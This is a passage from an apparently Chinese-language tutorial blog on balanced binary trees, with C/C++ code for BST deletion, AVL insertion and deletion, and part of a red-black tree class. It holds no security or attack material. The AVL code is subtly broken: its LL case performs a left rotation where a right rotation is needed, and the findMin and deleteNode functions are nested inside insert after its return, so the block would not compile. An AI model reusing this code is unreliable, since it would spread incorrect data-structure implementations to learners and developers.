&lt; val)&#123;<br>        root-&gt;right = removeNode(root-&gt;right,val);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;data &gt; val)&#123;<br>        root-&gt;left = removeNode(root-&gt;left,val);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-built_in">free</span>(root);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span>)&#123;<br>            TreeNode* temp = root-&gt;right;<br>            <span class="hljs-built_in">free</span>(root);<br>            <span class="hljs-keyword">return</span> temp;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>            TreeNode* temp = root-&gt;left;<br>            <span class="hljs-built_in">free</span>(root);<br>            <span class="hljs-keyword">return</span> temp;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            TreeNode* minNode = findMin(root-&gt;right);<br>            root-&gt;data = minNode-&gt;data;<br>            root-&gt;right = removeNode(root-&gt;right,minNode-&gt;data);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到BST的实现中存在一些问题</p><p>比如依次插入1,2,3,4,5</p><p>形成一个每个节点只有右子树的树</p><p>那和链表有什么区别!</p><p>因此引入了<code>平衡二叉树</code></p><p>即控制树的高度以保证其各类操作的高效性</p><p>先来看看<strong>AVL树</strong>吧</p><p>其定义为</p><p>对于任意一个节点，其左子树和右子树的高度差(<strong>平衡因子</strong>)的绝对值不超过<code>1</code>，一旦某次插入或删除操作破坏了这一约束，树结构便会通过<code>旋转</code>(rotation)操作进行调整，以重新恢复平衡</p><p>旋转有左旋，右旋</p><p>其中又分为四种情况，LL,RR,LR,RL，依旧分类讨论+递归</p><p>来看看具体怎么实现吧</p><h2 id="平衡二叉树之AVL树"><a href="#平衡二叉树之AVL树" class="headerlink" title="平衡二叉树之AVL树"></a>平衡二叉树之AVL树</h2><p><code>旋转</code>…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//定义</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>&#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-type">int</span> height;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">left</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">right</span>;</span><br>&#125; TreeNode;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">height</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>    <span class="hljs-keyword">return</span> node == <span class="hljs-literal">NULL</span> ? <span class="hljs-number">0</span> : node-&gt;height;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">return</span> a &gt; b ? a : b;<br>&#125;<br><br><span class="hljs-comment">//创建新节点</span><br>TreeNode* <span class="hljs-title function_">newNode</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span>&#123;<br>    TreeNode* node = (TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(TreeNode));<br>    node-&gt;data = val;<br>    node-&gt;left = <span class="hljs-literal">NULL</span>;<br>    node-&gt;right = <span class="hljs-literal">NULL</span>;<br>    node-&gt;height = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-comment">//右旋(LL)</span><br>TreeNode* <span class="hljs-title function_">rightRotate</span><span class="hljs-params">(TreeNode* y)</span>&#123;<br>    TreeNode* x = y-&gt;left;<br>    TreeNode* T2 = x-&gt;right;<br><br>    x-&gt;right = y;<br>    y-&gt;left = T2;<br><br>    y-&gt;height = max(height(y-&gt;left),height(y-&gt;right)) + <span class="hljs-number">1</span>;<br>    x-&gt;height = max(height(x-&gt;left),height(x-&gt;right)) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> x;<br>&#125;<br><br><span class="hljs-comment">//左旋(RR)</span><br>TreeNode* <span class="hljs-title function_">leftRotate</span><span class="hljs-params">(TreeNode* x)</span>&#123;<br>    TreeNode* y = x-&gt;right;<br>    TreeNode* T2 = y-&gt;left;<br><br>    y-&gt;left = x;<br>    x-&gt;right = T2;<br><br>    x-&gt;height = max(height(x-&gt;left),height(x-&gt;right)) + <span class="hljs-number">1</span>;<br>    y-&gt;height = max(height(y-&gt;left),height(y-&gt;right)) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> y;<br>&#125;<br><br><span class="hljs-comment">//平衡因子</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>    <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> height(node-&gt;left) - height(node-&gt;right);<br>&#125;<br><br><span class="hljs-comment">//AVL插入</span><br><br>TreeNode* <span class="hljs-title function_">insert</span><span class="hljs-params">(TreeNode* node,<span class="hljs-type">int</span> val)</span>&#123;<br>    <span class="hljs-comment">//普通BST插入</span><br>    <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> newNode(val);<br><br>    <span class="hljs-keyword">if</span>(val &lt; node-&gt;data)&#123;<br>        node-&gt;left = insert(node-&gt;left,val);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(val &gt; node-&gt;data)&#123;<br>        node-&gt;right = insert(node-&gt;right,val);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> node; <span class="hljs-comment">//AVL不插入重复值</span><br>    &#125;<br><br>    <span class="hljs-comment">//更新高度</span><br>    node-&gt;height = <span class="hljs-number">1</span> + max(height(node-&gt;left),height(node-&gt;right));<br><br>    <span class="hljs-comment">//计算平衡因子</span><br>    <span class="hljs-type">int</span> balance = getBalance(node);<br><br>    <span class="hljs-comment">//4种失衡情况</span><br><br>    <span class="hljs-comment">//LL</span><br>    <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; val &lt; node-&gt;left-&gt;data)&#123;<br>        <span class="hljs-keyword">return</span> leftRotate(node);<br>    &#125;<br>    <br>    <span class="hljs-comment">//RR</span><br>    <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; val &gt; node-&gt;right-&gt;data)&#123;<br>        <span class="hljs-keyword">return</span> leftRotate(node);<br>    &#125;<br><br>    <span class="hljs-comment">//LR</span><br>    <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; val &gt; node-&gt;left-&gt;data)&#123;<br>        node-&gt;left = leftRotate(node-&gt;left);<br>        <span class="hljs-keyword">return</span> rightRotate(node);<br>    &#125;<br><br>    <span class="hljs-comment">//RL</span><br>    <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; val &lt; node-&gt;right-&gt;data)&#123;<br>        node-&gt;right = rightRotate(node-&gt;right);<br>        <span class="hljs-keyword">return</span> leftRotate(node);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> node;<br><br>    <span class="hljs-comment">//查找最小节点</span><br>    TreeNode* <span class="hljs-title function_">findMin</span><span class="hljs-params">(TreeNode* node)</span>&#123;<br>        <span class="hljs-keyword">while</span>(node-&gt;left != <span class="hljs-literal">NULL</span>)&#123;<br>            node = node-&gt;left;<br>        &#125;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br><br>    <span class="hljs-comment">//AVL删除</span><br>    TreeNode* <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(TreeNode* root,<span class="hljs-type">int</span> key)</span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> root;<br>        &#125;<br><br>        <span class="hljs-comment">//BST删除</span><br>        <span class="hljs-keyword">if</span>(key &lt; root-&gt;data)&#123;<br>            root-&gt;left = deleteNode(root-&gt;left,key);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &gt; root-&gt;data)&#123;<br>            root-&gt;right = deleteNode(root-&gt;right,key);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span> || root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>                TreeNode* temp = root-&gt;left ? root-&gt;left : root-&gt;right;<br>                <span class="hljs-keyword">if</span>(temp == <span class="hljs-literal">NULL</span>)&#123;<br>                    temp = root;<br>                    root = <span class="hljs-literal">NULL</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    *root = *temp;<br>                &#125;<br>                <span class="hljs-built_in">free</span>(temp);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                TreeNode* temp = findMin(root-&gt;right);<br>                root-&gt;data = temp-&gt;data;<br>                root-&gt;right = deleteNode(root-&gt;right,temp-&gt;data);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> root;<br><br>        <span class="hljs-comment">//更新高度</span><br>        root-&gt;height = <span class="hljs-number">1</span> + max(height(root-&gt;left),height(root-&gt;right));<br><br>        <span class="hljs-comment">//调整平衡</span><br>        <span class="hljs-type">int</span> balance = getBalance(root);<br><br>        <span class="hljs-comment">//同理 4种失衡情况</span><br><br>        <span class="hljs-comment">//LL</span><br>        <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; getBalance(root-&gt;left) &gt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> rightRotate(root);<br>        &#125;<br><br>        <span class="hljs-comment">//RR</span><br>        <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; getBalance(root-&gt;right) &lt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> leftRotate(root);<br>        &#125;<br><br>        <span class="hljs-comment">//LR</span><br>        <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; getBalance(root-&gt;left) &lt; <span class="hljs-number">0</span>)&#123;<br>            root-&gt;left = leftRotate(root-&gt;left);<br>            <span class="hljs-keyword">return</span> rightRotate(root);<br>        &#125;<br><br>        <span class="hljs-comment">//RL</span><br>        <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">-1</span> &amp;&amp; getBalance(root-&gt;right) &gt; <span class="hljs-number">0</span>)&#123;<br>            root-&gt;right = rightRotate(root-&gt;right);<br>            <span class="hljs-keyword">return</span> leftRotate(root);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>理解</strong>…</p><p>有点懵了?</p><p>没事儿</p><p>还有更难绷的</p><p>接下来登场的是</p><p><code>红黑树</code>!!!</p><h2 id="平衡二叉树之红黑树"><a href="#平衡二叉树之红黑树" class="headerlink" title="平衡二叉树之红黑树"></a>平衡二叉树之红黑树</h2><p>逆天…</p><p>可以看到，AVL树的平衡条件过于严格，导致维护成本过高</p><p>不是在旋转，就是在旋转的路上…</p><p>因此又引入了<strong>红黑树</strong></p><p>通过对节点标记为<code>红色</code>或<code>黑色</code>，并维护一组颜色规则，确保从任意节点到其后代叶子节点的路径上，黑色节点的数量保持一致，从而避免树结构发生严重退化</p><p>这种设计哲学在旋转次数,维护成本与查找效率之间，取得了一个极为实用的折中，因此在工程中十分讨喜</p><p>下面”简单”实现一下</p><p>旋转操作和AVL树倒是差不多</p><p>但是这个各种染色操作太逆天了</p><p>不过还是依照一定的逻辑来的</p><p>自己细品吧…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 定义</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Color</span> &#123;</span> RED, BLACK &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> key;<br>    Color color;<br>    Node *left, *right, *parent;<br><br>    Node(<span class="hljs-type">int</span> k)<br>        : key(k), color(RED), left(nullptr), right(nullptr), parent(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 红黑树结构 + 旋转</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RBTree</span> &#123;</span><br>private:<br>    Node* root;<br>    Node* NIL; <span class="hljs-comment">// 黑色哨兵虚拟节点 用来代替所有的 nullptr 叶子节点 永远是黑色的</span><br><br>    <span class="hljs-comment">// 左旋</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">leftRotate</span><span class="hljs-params">(Node* x)</span> &#123;<br>        Node* y = x-&gt;right;<br>        x-&gt;right = y-&gt;left;<br>        <span class="hljs-keyword">if</span> (y-&gt;left != NIL)<br>            y-&gt;left-&gt;parent = x;<br><br>        y-&gt;parent = x-&gt;parent;<br>        <span class="hljs-keyword">if</span> (x-&gt;parent == NIL)<br>            root = y;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (x == x-&gt;parent-&gt;left)<br>            x-&gt;parent-&gt;left = y;<br>        <span class="hljs-keyword">else</span><br>            x-&gt;parent-&gt;right = y;<br><br>        y-&gt;left = x;<br>        x-&gt;parent = y;<br>    &#125;<br><br>    <span class="hljs-comment">// 右旋</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">rightRotate</span><span class="hljs-params">(Node* y)</span> &#123;<br>        Node* x = y-&gt;left;<br>        y-&gt;left = x-&gt;right;<br>        <span class="hljs-keyword">if</span> (x-&gt;right != NIL)<br>            x-&gt;right-&gt;parent = y;<br><br>        x-&gt;parent = y-&gt;parent;<br>        <span class="hljs-keyword">if</span> (y-&gt;parent == NIL)<br>            root = x;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (y == y-&gt;parent-&gt;left)<br>            y-&gt;parent-&gt;left = x;<br>        <span class="hljs-keyword">else</span><br>            y-&gt;parent-&gt;right = x;<br><br>        x-&gt;right = y;<br>        y-&gt;parent = x;<br>    &#125;<br><br>    <span class="hljs-comment">// 插入 + 插入修复</span><br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">insertFix</span><span class="hljs-params">(Node* z)</span> &#123;<br>        <span class="hljs-keyword">while</span> (z-&gt;parent-&gt;color == RED) &#123;<br>            <span class="hljs-keyword">if</span> (z-&gt;parent == z-&gt;parent-&gt;parent-&gt;left) &#123;<br>                Node* y = z-&gt;parent-&gt;parent-&gt;right; <span class="hljs-comment">// 叔叔</span><br>                <span class="hljs-keyword">if</span> (y-&gt;color == RED) &#123;              <span class="hljs-comment">// Case 1 叔叔是红色</span><br>                    z-&gt;parent-&gt;color = BLACK;       <span class="hljs-comment">// 叔父爷变色</span><br>                    y-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    z = z-&gt;parent-&gt;parent; <span class="hljs-comment">// 爷爷变插入节点</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (z == z-&gt;parent-&gt;right) &#123; <span class="hljs-comment">// Case 2 LR</span><br>                        z = z-&gt;parent;<br>                        leftRotate(z);<br>                    &#125;<br>                    <span class="hljs-comment">// Case 3 LL</span><br>                    z-&gt;parent-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    rightRotate(z-&gt;parent-&gt;parent);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;                               <span class="hljs-comment">// 对称</span><br>                Node* y = z-&gt;parent-&gt;parent-&gt;left; <span class="hljs-comment">// 叔叔</span><br>                <span class="hljs-keyword">if</span> (y-&gt;color == RED) &#123;<br>                    z-&gt;parent-&gt;color = BLACK;<br>                    y-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    z = z-&gt;parent-&gt;parent;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (z == z-&gt;parent-&gt;left) &#123;<br>                        z = z-&gt;parent;<br>                        rightRotate(z); <span class="hljs-comment">// RL</span><br>                    &#125;<br>                    <span class="hljs-comment">// RR</span><br>                    z-&gt;parent-&gt;color = BLACK;<br>                    z-&gt;parent-&gt;parent-&gt;color = RED;<br>                    leftRotate(z-&gt;parent-&gt;parent);<br>                &#125;<br>            &#125;<br>        &#125;<br>        root-&gt;color = BLACK;<br>    &#125;<br><br>    <span class="hljs-comment">// 移植 顶替</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">transplant</span><span class="hljs-params">(Node* u, Node* v)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u-&gt;parent == NIL)<br>            root = v;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (u == u-&gt;parent-&gt;left)<br>            u-&gt;parent-&gt;left = v;<br>        <span class="hljs-keyword">else</span><br>            u-&gt;parent-&gt;right = v;<br>        v-&gt;parent = u-&gt;parent;<br>    &#125;<br><br>    Node* <span class="hljs-title function_">minimum</span><span class="hljs-params">(Node* x)</span> &#123;<br>        <span class="hljs-keyword">while</span> (x-&gt;left != NIL)<br>            x = x-&gt;left;<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">deleteFix</span><span class="hljs-params">(Node* x)</span> &#123;<br>        <span class="hljs-keyword">while</span> (x != root &amp;&amp; x-&gt;color == BLACK) &#123;<br>            <span class="hljs-keyword">if</span> (x == x-&gt;parent-&gt;left) &#123;<br>                Node* w = x-&gt;parent-&gt;right;<br>                <span class="hljs-keyword">if</span> (w-&gt;color == RED) &#123; <span class="hljs-comment">// 兄弟是红色</span><br>                    w-&gt;color = BLACK;  <span class="hljs-comment">// 兄父变色 朝双黑旋转 保持双黑继续调整</span><br>                    x-&gt;parent-&gt;color = RED;<br>                    leftRotate(x-&gt;parent);<br>                    w = x-&gt;parent-&gt;right;<br>                &#125;<br>                <span class="hljs-comment">// 兄弟是黑色</span><br>                <span class="hljs-keyword">if</span> (w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK) &#123;<br>                    <span class="hljs-comment">// 兄弟的孩子都是黑色 兄弟变红 双黑上移(遇红or根变单黑)</span><br>                    w-&gt;color = RED;<br>                    x = x-&gt;parent;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// 兄弟至少有一个红孩子 变色(双黑变单黑) + 旋转(LL,RR,LR,RL)</span><br>                    <span class="hljs-keyword">if</span> (w-&gt;right-&gt;color == BLACK) &#123;<br>                        w-&gt;left-&gt;color = BLACK;<br>                        w-&gt;color = RED;<br>                        rightRotate(w);<br>                        w = x-&gt;parent-&gt;right;<br>                    &#125;<br>                    <span class="hljs-comment">// 变色逻辑</span><br>                    w-&gt;color = x-&gt;parent-&gt;color;<br>                    x-&gt;parent-&gt;color = BLACK;<br>                    w-&gt;right-&gt;color = BLACK;<br>                    leftRotate(x-&gt;parent);<br>                    x = root;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 对称</span><br>                Node* w = x-&gt;parent-&gt;left;<br>                <span class="hljs-keyword">if</span> (w-&gt;color == RED) &#123;<br>                    w-&gt;color = BLACK;<br>                    x-&gt;parent-&gt;color = RED;<br>                    rightRotate(x-&gt;parent);<br>                    w = x-&gt;parent-&gt;left;<br>                &#125;<br>                <span 